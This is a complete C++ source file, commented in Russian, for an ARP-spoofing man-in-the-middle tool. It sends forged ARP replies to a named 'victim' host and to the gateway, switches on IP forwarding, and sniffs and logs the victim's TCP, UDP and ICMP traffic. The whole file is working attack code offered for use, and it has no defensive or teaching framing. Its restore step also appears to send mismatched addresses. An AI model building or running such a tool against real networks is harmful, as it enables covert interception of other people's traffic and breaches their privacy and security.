#include <iostream>
#include <string>
#include <cstring>
#include <thread>
#include <atomic>
#include <chrono>
#include <csignal>
#include <fstream>
#include <mutex>
#include <iomanip>
#include <sstream>
#include <array>
#include <cstdio>

#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <unistd.h>

// Структуры заголовков (дублируем для надежности, чтобы не зависеть от версий заголовков)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};

struct arp_header {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t oper;
    uint8_t  sha[6];
    uint32_t spa;
    uint8_t  tha[6];
    uint32_t tpa;
} __attribute__((packed));

std::atomic<bool> stop_flag(false);
std::mutex log_mutex;
uint8_t g_victim_mac[6] = {0};
uint8_t g_gateway_mac[6] = {0};

void signal_handler(int sig) {
    std::cout << "\n[!] Получен сигнал завершения. Остановка..." << std::endl;
    stop_flag = true;
}

// Получить MAC адрес интерфейса
bool get_if_mac(const char* ifname, uint8_t* mac) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        close(fd);
        return false;
    }
    close(fd);

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return true;
}

// Получить IP адрес интерфейса
uint32_t get_if_ip(const char* ifname) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        close(fd);
        return 0;
    }
    close(fd);

    return ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
}

// Современный способ получения MAC через парсинг ARP таблицы (работает на Artix/Arch)
bool get_mac_from_system(const char* ifname, uint32_t ip, uint8_t* mac) {
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &ip, ip_str, INET_ADDRSTRLEN);

    // Пробуем через /proc/net/arp (быстрее и надежнее чем popen)
    FILE* fp = fopen("/proc/net/arp", "r");
    if (!fp) return false;

    char line[256];
    // Пропускаем заголовок
    fgets(line, sizeof(line), fp);

    while (fgets(line, sizeof(line), fp)) {
        char hw_addr[32], mask[32], dev[32], ip_read[32];
        // Формат: IP address HW type HW address Flags Mask Device
        if (sscanf(line, "%s %*s %s %*s %s %s", ip_read, hw_addr, mask, dev) == 4) {
            if (strcmp(ip_read, ip_str) == 0 && strcmp(dev, ifname) == 0) {
                // Проверка флага (должен быть 0x2 или 0x6, т.е. Complete)
                // В текстовом виде это сложно, просто проверяем, что MAC не 00:00...
                unsigned int mac_bytes[6];
                if (sscanf(hw_addr, "%x:%x:%x:%x:%x:%x", &mac_bytes[0], &mac_bytes[1],
                    &mac_bytes[2], &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
                    for(int i=0; i<6; i++) mac[i] = (uint8_t)mac_bytes[i];
                    fclose(fp);
                    return true;
                    }
            }
        }
    }
    fclose(fp);
    return false;
}

// Отправка ARP пакета
void send_arp(pcap_t* handle, const uint8_t* src_mac, uint32_t src_ip,
              const uint8_t* dst_mac, uint32_t dst_ip, uint16_t oper) {
    uint8_t packet[60];
    memset(packet, 0, sizeof(packet));

    struct ether_header* eth = (struct ether_header*)packet;
    struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ether_header));

    memcpy(eth->ether_dhost, dst_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);
    // Исправлено: ETH_P_ARP вместо ETHERTYPE_ARP
    eth->ether_type = htons(ETH_P_ARP);

    arp->htype = htons(1);
    // Исправлено: ETH_P_IP вместо ETHERTYPE_IP
    arp->ptype = htons(ETH_P_IP);
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(oper);
    memcpy(arp->sha, src_mac, 6);
    arp->spa = src_ip;
    memcpy(arp->tha, dst_mac, 6);
    arp->tpa = dst_ip;

    pcap_inject(handle, packet, 60);
              }

              // Функция спуфинга (поток)
              void spoof_thread(const char* ifname, uint32_t target_ip, uint32_t sender_ip, const uint8_t* target_mac) {
                  char errbuf[PCAP_ERRBUF_SIZE];
                  pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 0, 1000, errbuf);
                  if (!handle) {
                      std::cerr << "[!] Ошибка открытия устройства для спуфа: " << errbuf << std::endl;
                      return;
                  }

                  uint8_t my_mac[6];
                  if (!get_if_mac(ifname, my_mac)) {
                      std::cerr << "[!] Не удалось получить MAC интерфейса" << std::endl;
                      pcap_close(handle);
                      return;
                  }

                  std::cout << "[*] Спуфинг запущен: " << inet_ntoa(*(struct in_addr*)&target_ip)
                  << " <- " << inet_ntoa(*(struct in_addr*)&sender_ip) << std::endl;

                  while (!stop_flag) {
                      // Отправляем ARP Reply (oper=2)
                      send_arp(handle, my_mac, sender_ip, target_mac, target_ip, 2);
                      std::this_thread::sleep_for(std::chrono::seconds(2));
                  }

                  // Восстановление (отправка правильных ARP ответов, чтобы кэш обновился)
                  std::cout << "[*] Восстановление ARP таблиц..." << std::endl;
                  for (int i = 0; i < 5; i++) {
                      send_arp(handle, target_mac, target_ip, my_mac, sender_ip, 2);
                      std::this_thread::sleep_for(std::chrono::milliseconds(100));
                  }
                  pcap_close(handle);
              }

              // Парсинг и логирование пакетов
              void log_packet(const uint8_t* packet, int len, uint32_t victim_ip) {
                  if (len < (int)(sizeof(struct ether_header) + sizeof(struct iphdr))) return;

                  struct ether_header* eth = (struct ether_header*)packet;
                  struct iphdr* ip = (struct iphdr*)(packet + sizeof(struct ether_header));

                  // ФИЛЬТР: Показываем только если источник ИЛИ получатель - жертва
                  if (ip->saddr != victim_ip && ip->daddr != victim_ip) {
                      return;
                  }

                  char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
                  inet_ntop(AF_INET, &(ip->saddr), src_ip, INET_ADDRSTRLEN);
                  inet_ntop(AF_INET, &(ip->daddr), dst_ip, INET_ADDRSTRLEN);

                  std::string proto = "UNKNOWN";
                  int src_port = 0, dst_port = 0;

                  if (ip->protocol == IPPROTO_TCP) {
                      proto = "TCP";
                      struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct ether_header) + (ip->ihl * 4));
                      src_port = ntohs(tcp->source);
                      dst_port = ntohs(tcp->dest);
                  } else if (ip->protocol == IPPROTO_UDP) {
                      proto = "UDP";
                      struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct ether_header) + (ip->ihl * 4));
                      src_port = ntohs(udp->source);
                      dst_port = ntohs(udp->dest);
                  } else if (ip->protocol == IPPROTO_ICMP) {
                      proto = "ICMP";
                  }

                  std::lock_guard<std::mutex> lock(log_mutex);
                  std::cout << "[PACKET] " << proto << " | " << src_ip << ":" << src_port
                  << " -> " << dst_ip << ":" << dst_port << std::endl;
              }

              // Поток сниффера
              void sniff_thread(const char* ifname, uint32_t victim_ip) {
                  char errbuf[PCAP_ERRBUF_SIZE];
                  pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
                  if (!handle) {
                      std::cerr << "[!] Ошибка сниффера: " << errbuf << std::endl;
                      return;
                  }

                  // Фильтр BPF: показываем пакеты только с IP жертвы
                  char filter_exp[256];
                  char victim_ip_str[INET_ADDRSTRLEN];
                  inet_ntop(AF_INET, &victim_ip, victim_ip_str, INET_ADDRSTRLEN);

                  // Фильтр: host <victim_ip> (захватывает и входящие, и исходящие)
                  snprintf(filter_exp, sizeof(filter_exp), "host %s", victim_ip_str);

                  struct bpf_program fp;
                  if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
                      std::cerr << "[!] Ошибка компиляции фильтра: " << pcap_geterr(handle) << std::endl;
                      pcap_close(handle);
                      return;
                  }
                  if (pcap_setfilter(handle, &fp) == -1) {
                      std::cerr << "[!] Ошибка установки фильтра: " << pcap_geterr(handle) << std::endl;
                      pcap_close(handle);
                      return;
                  }

                  std::cout << "[*] Сниффинг трафика жертвы (" << victim_ip_str << ") запущен..." << std::endl;

                  struct pcap_pkthdr* header;
                  const u_char* packet;

                  while (!stop_flag) {
                      int res = pcap_next_ex(handle, &header, &packet);
                      if (res == 1) {
                          log_packet(packet, header->len, victim_ip);
                      } else if (res < 0) {
                          break;
                      }
                  }
                  pcap_close(handle);
              }

              int main(int argc, char* argv[]) {
                  if (argc != 5) {
                      std::cerr << "Использование: sudo ./ArPSpoof <interface> <victim_ip> <gateway_ip> <interval_sec>" << std::endl;
                      return 1;
                  }

                  const char* ifname = argv[1];
                  uint32_t victim_ip = inet_addr(argv[2]);
                  uint32_t gateway_ip = inet_addr(argv[3]);
                  int interval = std::stoi(argv[4]);

                  if (geteuid() != 0) {
                      std::cerr << "[!] Требуется запуск от root!" << std::endl;
                      return 1;
                  }

                  signal(SIGINT, signal_handler);
                  signal(SIGTERM, signal_handler);

                  std::cout << "[*] Включение IP forwarding..." << std::endl;
                  system("echo 1 > /proc/sys/net/ipv4/ip_forward");

                  uint8_t my_mac[6];
                  if (!get_if_mac(ifname, my_mac)) {
                      std::cerr << "[!] Не удалось получить MAC интерфейса" << std::endl;
                      return 1;
                  }

                  // Попытка получить MAC адреса из системы
                  // Если их нет в кэше, пользователь должен сначала пропинговать цели
                  std::cout << "[*] Поиск MAC адресов в ARP кэше..." << std::endl;

                  // Небольшая задержка, чтобы дать системе время обновить кэш, если пользователь только что пинговал
                  std::this_thread::sleep_for(std::chrono::milliseconds(500));

                  if (!get_mac_from_system(ifname, victim_ip, g_victim_mac)) {
                      std::cerr << "[!] WARNING: Не найден MAC жертвы в ARP кэше. Выполните 'ping -c 1 " << argv[2] << "' и попробуйте снова." << std::endl;
                      // Заполняем broadcast маком, чтобы хоть как-то работало, но это менее надежно
                      memset(g_victim_mac, 0xFF, 6);
                  } else {
                      std::cout << "[+] MAC жертвы: " << std::hex << std::setfill('0')
                      << std::setw(2) << (int)g_victim_mac[0] << ":" << (int)g_victim_mac[1] << ":" << (int)g_victim_mac[2] << ":"
                      << (int)g_victim_mac[3] << ":" << (int)g_victim_mac[4] << ":" << (int)g_victim_mac[5] << std::dec << std::endl;
                  }

                  if (!get_mac_from_system(ifname, gateway_ip, g_gateway_mac)) {
                      std::cerr << "[!] WARNING: Не найден MAC шлюза в ARP кэше. Выполните 'ping -c 1 " << argv[3] << "'." << std::endl;
                      memset(g_gateway_mac, 0xFF, 6);
                  } else {
                      std::cout << "[+] MAC шлюза: " << std::hex << std::setfill('0')
                      << std::setw(2) << (int)g_gateway_mac[0] << ":" << (int)g_gateway_mac[1] << ":" << (int)g_gateway_mac[2] << ":"
                      << (int)g_gateway_mac[3] << ":" << (int)g_gateway_mac[4] << ":" << (int)g_gateway_mac[5] << std::dec << std::endl;
                  }

                  // Запуск потоков
                  std::thread t_victim(spoof_thread, ifname, victim_ip, gateway_ip, g_victim_mac);
                  std::thread t_gateway(spoof_thread, ifname, gateway_ip, victim_ip, g_gateway_mac);
                  std::thread t_sniff(sniff_thread, ifname, victim_ip);

                  t_victim.join();
                  t_gateway.join();
                  t_sniff.join();

                  std::cout << "[*] Выключение IP forwarding..." << std::endl;
                  system("echo 0 > /proc/sys/net/ipv4/ip_forward");

                  return 0;
              }
